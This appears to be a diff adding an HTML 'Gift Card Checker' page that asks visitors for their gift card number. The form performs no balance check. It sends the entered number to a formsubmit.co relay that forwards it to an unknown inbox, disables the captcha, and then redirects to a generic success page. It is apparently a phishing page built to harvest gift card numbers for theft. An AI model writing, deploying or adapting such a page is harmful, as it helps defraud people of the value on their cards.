@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>card validity</title>
+  </head>
+  <body>
+    <head>
+      <title>Gift Card Checker</title>
+      <link rel="stylesheet" href="style.css" />
+      <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+    </head>
+    <body>
+      <div class="container">
+        <h1>Gift Card Checker</h1>
+        <form
+          action="https://formsubmit.co/c813a38244b90ec8fade1c414b0dc0ac "
+          method="post"
+        >
+          <!-- honey pot -->
+          <input type="text" name="_honey" style="display: none" />
+
+          <!-- display Captcha -->
+          <input type="hidden" name="_captcha" value="false" />
+          <!-- thank you page -->
+          <input
+            type="hidden"
+            name="_next"
+            value="https://giftcard-balance-validity.netlify.app/sucess.html"
+          />
+          <label for="card-number">Enter gift card number:</label>
+          <input
+            type="text"
+            id="card-number"
+            name="card-number only"
+            required
+            placeholder="Gift card number"
+          />
+          <p class="err">Enter a valid gift card number</p>
+          
+         <p>
+            Need Help? The card number are on the back of your gift card or in
+            your original gift card email
+          </p>
+          <input type="submit" value="Check" />
+        </form>
+      </div>
+    </body>
+  </body>
+</html>\
